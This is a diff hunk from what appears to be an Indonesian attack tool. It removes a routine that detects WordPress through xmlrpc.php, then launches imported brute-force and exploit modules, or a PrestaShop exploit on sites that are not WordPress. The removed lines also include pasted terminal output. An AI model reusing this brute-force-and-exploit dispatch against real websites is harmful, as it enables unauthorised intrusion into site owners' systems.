@@ -5,45 +5,6 @@
 # kerja bangsat                                #
 ################################################
 
-import requests as req
-from galer.wpbrute import go_brute
-from galer.prestashop import go_exploit
-from galer.wpexploit import wpexploit
-
-headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'}
-
-def check_cms(url):
-        try:
-                http = req.get(url+"/xmlrpc.php",headers=headers,verify=True)
-                if 'XML-RPC' in http.text:
-                        print(colored("{} WORDPRESS".format(url),'yellow'))
-                        exploit(url)
-                else:
-                        print(colored("{} NOT WORDPRESS".format(url),'yellow'))
-                        exploit_other(url)
-        except:
-                print(colored("Unknow error check cms.",'red'))
-
-def exploit(url):
-        try:
-                go_brute(url)
-                wpexploit(url)
-        except:
-                print(colored("Seems we got error in function exploit",'red'))
-
-def exploit_other(url):
-        try:
-                go_exploit(url)
-        except:
-                print(colored("Seems we got error in function exploit",'red'))
-dinar@LAPTOP-CRCFO6ME:~/GabutEX$ cat galer/module.py
-#!/usr/bin/python3
-################################################
-# Created By Dinar Hamid                       #
-# module created by Galeh Rizky And Dinar Hamid#
-# kerja bangsat                                #
-################################################
-
 import time,json,os
 import requests as req
 from bs4 import BeautifulSoup as peler
